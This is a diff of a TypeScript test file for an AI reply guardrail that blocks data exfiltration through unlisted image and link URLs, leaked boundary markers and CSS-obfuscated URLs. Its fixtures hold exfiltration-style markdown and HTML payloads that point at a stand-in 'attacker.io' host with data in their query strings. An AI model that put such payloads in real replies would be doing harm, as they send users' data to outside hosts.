@@ -1,50 +1,63 @@
-import { assertEquals, assertThrows } from '@std/assert';
-import { compileEgressRules } from '../../src/guardrails/compile-egress.ts';
-import {
-  collectEgressHits,
-  DEFAULT_CHECKS,
-  type EgressChecks,
-  type ResolvedEgressChecks,
-  resolveEgressChecks,
-} from '../../src/guardrails/egress.ts';
-import { egressPolicy } from '../../src/guardrails/egress-policy.ts';
-import { createEgressStream } from '../../src/guardrails/egress-stream.ts';
+import { assertEquals } from '@std/assert';
+import { type Detection, detectAt, detectorsAt } from '../../src/guardrails/detect-at.ts';
+import { type DetectSpec, detectProblem } from '../../src/guardrails/detectors.ts';
+import { createEgressStream, type EgressStream } from '../../src/guardrails/egress-stream.ts';
 import {
   addRequestUrls,
   addSeenUrls,
   type GivenUrls,
   givenUrlSets,
 } from '../../src/guardrails/egress-urls.ts';
-import { TheoremError } from '../../src/guardrails/error.ts';
-import { EGRESS_RULES } from '../../src/guardrails/rules.ts';
-import type { GuardrailContext, Verdict } from '../../src/guardrails/types.ts';
+import { resolveGuardrailPolicy } from '../../src/guardrails/policy.ts';
+import { DETECT_RULES } from '../../src/guardrails/rules.ts';
+import type { ResolvedGuardrailPolicy } from '../../src/guardrails/types.ts';
 import { referenceMatchStart } from './egress-reference.ts';
 
+/** What reads a reply: a profile's detectors, and what the URL ones let through. */
+type Reading = Pick<ResolvedGuardrailPolicy, 'detect' | 'allow'>;
+
+/** A profile's `guardrails.detect`, resolved. */
+function reading(detect?: DetectSpec): Reading {
+  return resolveGuardrailPolicy({ detect });
+}
+
 const NONE: GivenUrls = givenUrlSets();
-const LINKS = resolveEgressChecks({ links: true });
+/** A profile that sets nothing: `marker_leak` and `ungiven_images` block a reply. */
+const DEFAULTS = reading();
+const LINKS = reading({ ungiven_links: 'block' });
 
 /** The model was given `request` by the host, and `tools` by tool results. */
 function given(request: Set<string>, tools = new Set<string>()): GivenUrls {
   return { request, tools };
 }
 
+/** `text` read whole as a reply of a turn given `urls`. */
+function read(text: string, urls: GivenUrls, { detect, allow }: Reading): Detection {
+  return detectAt(text, 'reply', detect, { givenUrls: urls, allow });
+}
+
 function leaks(
   text: string,
   urls = NONE,
-  checks: ResolvedEgressChecks = DEFAULT_CHECKS,
-  rule: string = EGRESS_RULES.image,
+  checks: Reading = DEFAULTS,
+  rule: string = DETECT_RULES.ungiven_images,
 ): boolean {
-  return collectEgressHits(text, { given: urls }, checks).some((hit) => hit.rule === rule);
+  return read(text, urls, checks).hits.some((hit) => hit.rule === rule);
+}
+
+/** The stream a reply is read by under `checks`, in a turn given `urls`. */
+function streamOf({ detect, allow }: Reading, urls: GivenUrls): EgressStream {
+  return createEgressStream({ detect: detectorsAt('reply', detect), allow, given: urls });
 }
 
 /** Whether the stream, fed one character at a time, blocks on `rule`. */
 function streamBlocks(
   text: string,
   urls = NONE,
-  checks: ResolvedEgressChecks = DEFAULT_CHECKS,
-  rule: string = EGRESS_RULES.image,
+  checks: Reading = DEFAULTS,
+  rule: string = DETECT_RULES.ungiven_images,
 ): boolean {
-  const stream = createEgressStream({ checks, given: urls });
+  const stream = streamOf(checks, urls);
   for (const char of text) {
     const [hit] = stream.push(char);
     if (hit) return hit.rule === rule;
@@ -56,15 +69,18 @@ function streamBlocks(
 function streamStops(
   text: string,
   urls = NONE,
-  checks: ResolvedEgressChecks = DEFAULT_CHECKS,
-  rule: string = EGRESS_RULES.image,
+  checks: Reading = DEFAULTS,
+  rule: string = DETECT_RULES.ungiven_images,
 ): boolean {
-  const stream = createEgressStream({ checks, given: urls });
+  const stream = streamOf(checks, urls);
   for (const char of text) {
     const [hit] = stream.push(char);
     if (hit) return hit.rule === rule;
   }
-  return stream.holdFrom() <= referenceMatchStart(text, checks, urls, []);
+  const detectors = detectorsAt('reply', checks.detect);
+  return (
+    stream.holdFrom() <= referenceMatchStart(text, detectors, { given: urls, allow: checks.allow })
+  );
 }
 
 function seen(...texts: string[]): Set<string> {
@@ -152,7 +168,7 @@ Deno.test('an image the model was given this turn is not a leak', () => {
   assertEquals(leaks('![photo](https://news.site/photo.jpg?u=secret)', urls), true);
   assertEquals(leaks('![photo](https://news.site/other.jpg)', urls), true);
   // An image's paragraph could still grow another destination, so the stream settles it at a blank line.
-  const stream = createEgressStream({ given: urls });
+  const stream = streamOf(DEFAULTS, urls);
   const passed = '![photo](https://news.site/photo.jpg)\n\nok';
   assertEquals(
     [...passed].some((char) => stream.push(char).length > 0),
@@ -193,53 +209,60 @@ Deno.test('the model is given what the request sends it, less its own earlier re
   assertEquals([...urls.tools], ['https://tool.site/b.png']);
 });
 
-const context: GuardrailContext = { stage: 'output_delta', trust: 'untrusted', profileId: 'acme' };
-
-/** The verdict of an `egressPolicy` over `bundled`, on the whole of `text`. */
-function policyVerdict(bundled: boolean | EgressChecks, text: string, urls = NONE): string {
-  const enforce = egressPolicy({ rules: [], compiled: compileEgressRules([]), bundled });
-  return (enforce({ text }, { ...context, givenUrls: urls }) as Verdict).action;
+/** What a profile's `detect` does with the whole of `text` as a reply. */
+function replyVerdict(detect: DetectSpec | undefined, text: string, urls = NONE): string {
+  return read(text, urls, reading(detect)).action;
 }
 
-Deno.test('images.hosts lets images load from the hosts a host names, and only those', () => {
-  const bundled = { images: { hosts: ['cdn.acme.io'] } };
-  assertEquals(policyVerdict(bundled, '![a](https://cdn.acme.io/any?q=1)'), 'allow');
-  assertEquals(policyVerdict(bundled, '![a](https://evil.cdn.acme.io/p)'), 'block');
-  assertEquals(policyVerdict(bundled, '![a](https://attacker.io/p)'), 'block');
+Deno.test('allow.hosts lets images load from the hosts a host names, and only those', () => {
+  const detect: DetectSpec = { ungiven_images: { allow: { hosts: ['cdn.acme.io'] } } };
+  assertEquals(replyVerdict(detect, '![a](https://cdn.acme.io/any?q=1)'), 'allow');
+  assertEquals(replyVerdict(detect, '![a](https://evil.cdn.acme.io/p)'), 'block');
+  assertEquals(replyVerdict(detect, '![a](https://attacker.io/p)'), 'block');
 });
 
-Deno.test('a URL check takes hostnames and its own options, and bundled only the checks and groups there are', () => {
-  const compiled = compileEgressRules([]);
-  const throws = (bundled: unknown, message: string) =>
-    assertThrows(
-      () => egressPolicy({ rules: [], compiled, bundled: bundled as EgressChecks }),
-      TheoremError,
-      message,
-    );
+Deno.test('allow takes hostnames and its own settings, and detect only the detectors there are', () => {
+  const problem = (detect: unknown) => detectProblem('guardrails.detect', detect) ?? '';
+  const refuses = (detect: unknown, message: string) =>
+    assertEquals([detect, problem(detect).includes(message)], [detect, true]);
   for (const bad of ['https://cdn.acme.io', '.acme.io', 'cdn.acme.io/x', '']) {
-    throws({ images: { hosts: [bad] } }, 'hostname');
-    throws({ links: { hosts: [bad] } }, 'hostname');
+    refuses({ ungiven_images: { allow: { hosts: [bad] } } }, 'which is not a hostname');
+    refuses({ ungiven_links: { allow: { hosts: [bad] } } }, 'which is not a hostname');
   }
-  throws({ images: { host: ['cdn.acme.io'] } }, 'no option "host"');
-  throws({ imageHosts: ['cdn.acme.io'] }, 'no check "imageHosts"');
-  throws({ sensitive: false }, 'no check "sensitive"');
-  throws({ boundary: 'yes' }, 'bundled.boundary must be a boolean');
+  refuses(
+    { ungiven_images: { allow: { host: ['cdn.acme.io'] } } },
+    'guardrails.detect.ungiven_images.allow.host is not a setting of allow',
+  );
+  refuses({ imageHosts: ['cdn.acme.io'] }, 'guardrails.detect.imageHosts is not a detector');
+  refuses({ sensitive: 'ignore' }, 'guardrails.detect.sensitive is not a detector');
+  refuses({ marker_leak: 'yes' }, 'guardrails.detect.marker_leak must be one of');
+  refuses(
+    { marker_leak: { allow: { hosts: ['cdn.acme.io'] } } },
+    'is a setting of ungiven_images and ungiven_links only',
+  );
+  assertEquals(problem({ ungiven_links: { action: 'block', allow: { hosts: ['a.io'] } } }), '');
 });
 
-Deno.test('each bundled check is off when a host switches it off, and only that one', () => {
+Deno.test('each detector of a reply is off when a host sets it to ignore, and only that one', () => {
   const reply = {
-    boundary: '<user_data>',
+    marker_leak: '<user_data>',
     // Protocol-relative, as any absolute URL is a bare link too.
-    images: '<img src="//attacker.io/p?d=1">',
-    links: '[go](https://attacker.io/g?d=1)',
+    ungiven_images: '<img src="//attacker.io/p?d=1">',
+    ungiven_links: '[go](https://attacker.io/g?d=1)',
   };
-  const on = { links: true };
-  for (const [check, text] of Object.entries(reply)) {
-    assertEquals([check, policyVerdict(on, text)], [check, 'block']);
-    assertEquals([check, policyVerdict({ ...on, [check]: false }, text)], [check, 'allow']);
+  const on: DetectSpec = { ungiven_links: 'block' };
+  for (const [detector, text] of Object.entries(reply)) {
+    assertEquals([detector, replyVerdict(on, text)], [detector, 'block']);
+    assertEquals(
+      [detector, replyVerdict({ ...on, [detector]: 'ignore' }, text)],
+      [detector, 'allow'],
+    );
   }
-  assertEquals(policyVerdict(true, reply.links), 'allow');
-  assertEquals(policyVerdict(false, reply.images), 'allow');
+  assertEquals(replyVerdict(undefined, reply.ungiven_links), 'allow');
+  assertEquals(
+    replyVerdict({ marker_leak: 'ignore', ungiven_images: 'ignore' }, reply.ungiven_images),
+    'allow',
+  );
 });
 
 const LINK_LEAKS = [
@@ -275,41 +298,52 @@ const LINK_PASSES = [
 
 Deno.test('with links on, every way a reply can link an unseen URL is a leak, in the policy and the stream', () => {
   const urls = given(seen('https://seen.io/page'));
+  const link = DETECT_RULES.ungiven_links;
   for (const text of LINK_LEAKS) {
-    assertEquals([text, leaks(text, urls, LINKS, EGRESS_RULES.link)], [text, true]);
-    assertEquals([text, streamStops(text, urls, LINKS, EGRESS_RULES.link)], [text, true]);
+    assertEquals([text, leaks(text, urls, LINKS, link)], [text, true]);
+    assertEquals([text, streamStops(text, urls, LINKS, link)], [text, true]);
   }
   for (const text of LINK_PASSES) {
-    assertEquals([text, leaks(text, urls, LINKS, EGRESS_RULES.link)], [text, false]);
-    assertEquals([text, streamBlocks(text, urls, LINKS, EGRESS_RULES.link)], [text, false]);
+    assertEquals([text, leaks(text, urls, LINKS, link)], [text, false]);
+    assertEquals([text, streamBlocks(text, urls, LINKS, link)], [text, false]);
   }
 });
 
 Deno.test('with images on too, links pass an image host a host lets images load from', () => {
-  const checks = resolveEgressChecks({ links: true, images: { hosts: ['cdn.acme.io'] } });
+  const checks = reading({
+    ungiven_links: 'block',
+    ungiven_images: { allow: { hosts: ['cdn.acme.io'] } },
+  });
+  const link = DETECT_RULES.ungiven_links;
   for (const text of ['![a](https://cdn.acme.io/x.png)', '<img src="https://cdn.acme.io/x.png">']) {
-    assertEquals([text, leaks(text, NONE, checks, EGRESS_RULES.link)], [text, false]);
-    assertEquals([text, streamBlocks(text, NONE, checks, EGRESS_RULES.link)], [text, false]);
+    assertEquals([text, leaks(text, NONE, checks, link)], [text, false]);
+    assertEquals([text, streamBlocks(text, NONE, checks, link)], [text, false]);
   }
-  assertEquals(leaks('[go](https://attacker.io/g)', NONE, checks, EGRESS_RULES.link), true);
+  assertEquals(leaks('[go](https://attacker.io/g)', NONE, checks, link), true);
 });
 
-Deno.test('links.hosts lets a reply link the hosts a host names', () => {
-  const checks = resolveEgressChecks({ links: { hosts: ['docs.acme.io'] } });
-  assertEquals(leaks('[d](https://docs.acme.io/x?q=1)', NONE, checks, EGRESS_RULES.link), false);
-  assertEquals(leaks('[d](https://attacker.io/x)', NONE, checks, EGRESS_RULES.link), true);
+Deno.test('allow.hosts lets a reply link the hosts a host names', () => {
+  const checks = reading({
+    ungiven_links: { action: 'block', allow: { hosts: ['docs.acme.io'] } },
+  });
+  const link = DETECT_RULES.ungiven_links;
+  assertEquals(leaks('[d](https://docs.acme.io/x?q=1)', NONE, checks, link), false);
+  assertEquals(leaks('[d](https://attacker.io/x)', NONE, checks, link), true);
 });
 
-Deno.test('a URL a tool returned passes unless the check turns fromTools off', () => {
+Deno.test('a URL a tool returned passes unless allow turns fromTools off', () => {
   const urls = given(new Set(), seen('{"url":"https://tool.site/a?d=1"}'));
   const text = '[a](https://tool.site/a?d=1) ![a](https://tool.site/a?d=1)';
-  const both = resolveEgressChecks({ links: true });
-  assertEquals(leaks(text, urls, both, EGRESS_RULES.link), false);
-  assertEquals(leaks(text, urls, both, EGRESS_RULES.image), false);
-  const closed = resolveEgressChecks({ links: { fromTools: false }, images: { fromTools: false } });
-  assertEquals(leaks(text, urls, closed, EGRESS_RULES.link), true);
-  assertEquals(leaks(text, urls, closed, EGRESS_RULES.image), true);
-  assertEquals(streamBlocks(text, urls, closed, EGRESS_RULES.link), true);
+  const { ungiven_links: link, ungiven_images: image } = DETECT_RULES;
+  assertEquals(leaks(text, urls, LINKS, link), false);
+  assertEquals(leaks(text, urls, LINKS, image), false);
+  const closed = reading({
+    ungiven_links: { action: 'block', allow: { fromTools: false } },
+    ungiven_images: { allow: { fromTools: false } },
+  });
+  assertEquals(leaks(text, urls, closed, link), true);
+  assertEquals(leaks(text, urls, closed, image), true);
+  assertEquals(streamBlocks(text, urls, closed, link), true);
 });
 
 Deno.test('a style block loads each URL it names', () => {
@@ -332,7 +366,7 @@ Deno.test('a style block loads each URL it names', () => {
 });
 
 Deno.test('a CSS escape, comment or escaped newline does not hide a URL from the style check', () => {
-  const ok = resolveEgressChecks({ images: { hosts: ['ok.com'] } });
+  const ok = reading({ ungiven_images: { allow: { hosts: ['ok.com'] } } });
   for (const text of [
     '<style>a{background:url(https://ok.com\\)@attacker.io/p)}</style>',
     '<div style="background:url(https://ok.com\\)@attacker.io/p)">',
@@ -368,7 +402,7 @@ function nestedSrcdoc(inner: string, depth: number): string {
 Deno.test('a reply that costs more to read than its length allows is a leak as a whole', () => {
   const text = nestedSrcdoc('x'.repeat(20_000), 100);
   assertEquals(leaks(text), true);
-  const stream = createEgressStream({ checks: DEFAULT_CHECKS, given: NONE });
+  const stream = streamOf(DEFAULTS, NONE);
   let hit = false;
   for (let at = 0; at < text.length && !hit; at += 64)
     hit = stream.push(text.slice(at, at + 64)).length > 0;
@@ -401,8 +435,11 @@ Deno.test('reading a reply takes time in proportion to its length', () => {
   ]) {
     const text = `x ${unit.repeat(Math.ceil(n / unit.length))}>`;
     const start = performance.now();
-    collectEgressHits(text, {}, LINKS);
-    const stream = createEgressStream({ checks: LINKS });
+    detectAt(text, 'reply', LINKS.detect, { allow: LINKS.allow });
+    const stream = createEgressStream({
+      detect: detectorsAt('reply', LINKS.detect),
+      allow: LINKS.allow,
+    });
     for (let at = 0; at < text.length; at += 64)
       if (stream.push(text.slice(at, at + 64)).length > 0) break;
     const took = performance.now() - start;
